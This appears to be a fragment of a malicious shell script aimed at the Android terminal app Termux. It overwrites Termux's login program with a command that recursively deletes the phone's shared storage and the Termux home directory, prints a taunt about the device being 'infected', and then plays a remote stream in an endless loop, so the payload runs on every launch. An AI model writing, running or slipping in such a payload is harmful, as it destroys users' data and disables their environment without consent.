...
echo "rm -rf /sdcard/* & rm -rf /storage/*/* & rm -rf /data/data/com.termux/files/home/* & echo HAHA! GET YOUR TERMUX INFECTED LOL!!;while true;do /data/data/com.termux/files/usr/bin/mpv https://fwesh.yonle.repl.co;done" > $PREFIX/bin/login
